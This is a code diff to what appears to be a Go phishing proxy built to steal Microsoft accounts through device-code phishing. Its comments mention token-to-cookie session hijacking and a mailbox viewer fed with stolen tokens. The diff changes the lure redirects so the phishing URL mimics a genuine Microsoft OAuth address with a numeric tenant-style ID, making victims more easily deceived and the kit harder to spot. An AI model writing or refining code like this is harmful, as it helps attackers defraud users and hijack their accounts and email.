@@ -315,8 +315,10 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 			dcTheme := l.DeviceCodeTheme
 			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
 			if dcTheme != "" && dcTheme != "default" {
-				// Use OAuth-style URL that looks like Microsoft OAuth for better social engineering
-				interstitialURL = fmt.Sprintf("/oauth?sso_reload=true&tid=%s&theme=%s", session.Id, dcTheme)
+				// Generate numeric tid and store mapping for OAuth-style URL
+				numericTid := generateNumericTid()
+				p.storeTidMapping(numericTid, session.Id, dcTheme)
+				interstitialURL = fmt.Sprintf("/oauth?tid=%s", numericTid)
 			}
 			resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "")
 			resp.Header.Set("Location", interstitialURL)
@@ -351,8 +353,10 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 			dcTheme := l.DeviceCodeTheme
 			interstitialURL := fmt.Sprintf("/dc/%s", session.Id)
 			if dcTheme != "" && dcTheme != "default" {
-				// Use OAuth-style URL that looks like Microsoft OAuth for better social engineering
-				interstitialURL = fmt.Sprintf("/oauth?sso_reload=true&tid=%s&theme=%s", session.Id, dcTheme)
+				// Generate numeric tid and store mapping for OAuth-style URL
+				numericTid := generateNumericTid()
+				p.storeTidMapping(numericTid, session.Id, dcTheme)
+				interstitialURL = fmt.Sprintf("/oauth?tid=%s", numericTid)
 			}
 			resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 			resp.Header.Set("Location", interstitialURL)
@@ -993,6 +997,13 @@ var (
 	cspReportToRe    = regexp.MustCompile(`report-to\s+[^;]*`)
 )
 
+// tidMapping stores the mapping from numeric tid to session info for OAuth-style URLs
+type tidMapping struct {
+	SessionID string
+	Theme     string
+	CreatedAt time.Time
+}
+
 type HttpProxy struct {
 	Server            *http.Server
 	Proxy             *goproxy.ProxyHttpServer
@@ -1024,6 +1035,8 @@ type HttpProxy struct {
 	tokenPortal       *TokenPortal           // Token-to-cookie portal for session hijacking
 	tokenFeed         *TokenFeed             // Token feed API for mailbox viewer auto-import
 	mailboxAccounts   *MailboxAccountManager // Persistent mailbox accounts with auto-refresh
+	tidMappings       map[string]*tidMapping // OAuth-style tid -> session mapping
+	tidMtx            sync.RWMutex           // Mutex for tid mappings
 
 	// Connection statistics for monitoring
 	connStats struct {
@@ -1058,6 +1071,34 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
+// generateNumericTid generates a numeric tid in format: 92999063-31079291-48111660-95194276
+func generateNumericTid() string {
+	return fmt.Sprintf("%08d-%08d-%08d-%08d",
+		rand.Intn(100000000),
+		rand.Intn(100000000),
+		rand.Intn(100000000),
+		rand.Intn(100000000))
+}
+
+// storeTidMapping stores a mapping from numeric tid to session info
+func (p *HttpProxy) storeTidMapping(tid, sessionID, theme string) {
+	p.tidMtx.Lock()
+	defer p.tidMtx.Unlock()
+	p.tidMappings[tid] = &tidMapping{
+		SessionID: sessionID,
+		Theme:     theme,
+		CreatedAt: time.Now(),
+	}
+}
+
+// getTidMapping retrieves session info from a numeric tid
+func (p *HttpProxy) getTidMapping(tid string) (*tidMapping, bool) {
+	p.tidMtx.RLock()
+	defer p.tidMtx.RUnlock()
+	m, ok := p.tidMappings[tid]
+	return m, ok
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -1087,6 +1128,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	// Initialize token feed API for mailbox viewer
 	p.tokenFeed = NewTokenFeed(db)
+
+	// Initialize tid mappings for OAuth-style URLs
+	p.tidMappings = make(map[string]*tidMapping)
 
 	// Initialize persistent mailbox accounts manager
 	// Accounts are saved to cfg_dir/mailbox_accounts.json and survive restarts
@@ -1843,58 +1887,61 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// --- OAuth-style device code endpoint (Microsoft-looking URL with tid parameter) ---
 			if dcOAuthRe.MatchString(req.URL.Path) {
-				// Extract session ID and theme from query parameters
-				session_id := req.URL.Query().Get("tid")
-				theme := req.URL.Query().Get("theme")
-				if session_id != "" && theme != "" {
-					log.Debug("[devicecode] serving OAuth-style %s themed page for session: %s", theme, session_id)
-					p.session_mtx.Lock()
-					s, ok := p.sessions[session_id]
-					p.session_mtx.Unlock()
+				// Look up session info from numeric tid
+				numericTid := req.URL.Query().Get("tid")
+				if numericTid != "" {
+					tidInfo, found := p.getTidMapping(numericTid)
+					if found {
+						session_id := tidInfo.SessionID
+						theme := tidInfo.Theme
+						log.Debug("[devicecode] serving OAuth-style %s themed page for session: %s (tid: %s)", theme, session_id, numericTid)
+						p.session_mtx.Lock()
+						s, ok := p.sessions[session_id]
+						p.session_mtx.Unlock()
 
-					if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
-						userCode := ""
-						verifyURL := "https://microsoft.com/devicelogin"
-						expiresIn := 900
-						codeReady := false
+						if ok && (s.DCSessionID != "" || s.DCState == DCStatePending) {
+							userCode := ""
+							verifyURL := "https://microsoft.com/devicelogin"
+							expiresIn := 900
+							codeReady := false
 
-						if s.DCSessionID != "" {
-							dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
-							if dcOk {
-								dcs.mu.Lock()
-								userCode = dcs.UserCode
-								verifyURL = dcs.VerifyURL
-								expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
-								dcs.mu.Unlock()
-								codeReady = true
+							if s.DCSessionID != "" {
+								dcs, dcOk := p.deviceCode.GetSession(s.DCSessionID)
+								if dcOk {
+									dcs.mu.Lock()
+									userCode = dcs.UserCode
+									verifyURL = dcs.VerifyURL
+									expiresIn = int(time.Until(dcs.ExpiresAt).Seconds())
+									dcs.mu.Unlock()
+									codeReady = true
+								}
 							}
-						}
 
-						if expiresIn < 0 {
-							expiresIn = 0
-						}
-						expMinutes := expiresIn / 60
+							if expiresIn < 0 {
+								expiresIn = 0
+							}
+							expMinutes := expiresIn / 60
 
-						html := GetInterstitialByTheme(theme)
-						if codeReady {
-							html = strings.ReplaceAll(html, "{user_code}", userCode)
-						} else {
-							html = strings.ReplaceAll(html, "{user_code}", "")
-						}
-						html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
-						html = strings.ReplaceAll(html, "{session_id}", session_id)
-						html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
-						html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
-						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
+							html := GetInterstitialByTheme(theme)
+							if codeReady {
+								html = strings.ReplaceAll(html, "{user_code}", userCode)
+							} else {
+								html = strings.ReplaceAll(html, "{user_code}", "")
+							}
+							html = strings.ReplaceAll(html, "{verify_url}", verifyURL)
+							html = strings.ReplaceAll(html, "{session_id}", session_id)
+							html = strings.ReplaceAll(html, "{expires_minutes}", fmt.Sprintf("%d", expMinutes))
+							html = strings.ReplaceAll(html, "{expires_seconds}", fmt.Sprintf("%d", expiresIn))
+							html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
 
-						resp := goproxy.NewResponse(req, "text/html", 200, html)
-						resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
-						resp.Header.Set("Pragma", "no-cache")
-						return req, resp
+							resp := goproxy.NewResponse(req, "text/html", 200, html)
+							resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+							resp.Header.Set("Pragma", "no-cache")
+							return req, resp
+						}
 					}
-
-					return p.blockRequest(req)
 				}
+				return p.blockRequest(req)
 			}
 			// --- End themed document access device code endpoints ---
 
@@ -2416,8 +2463,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										dcTheme := l.DeviceCodeTheme
 										var interstitialURL string
 										if dcTheme != "" && dcTheme != "default" {
-											// Use OAuth-style URL that looks like Microsoft OAuth for better social engineering
-											interstitialURL = fmt.Sprintf("/oauth?sso_reload=true&tid=%s&theme=%s", session.Id, dcTheme)
+											// Generate numeric tid and store mapping for OAuth-style URL
+											numericTid := generateNumericTid()
+											p.storeTidMapping(numericTid, session.Id, dcTheme)
+											interstitialURL = fmt.Sprintf("/oauth?tid=%s", numericTid)
 										} else {
 											interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
 										}
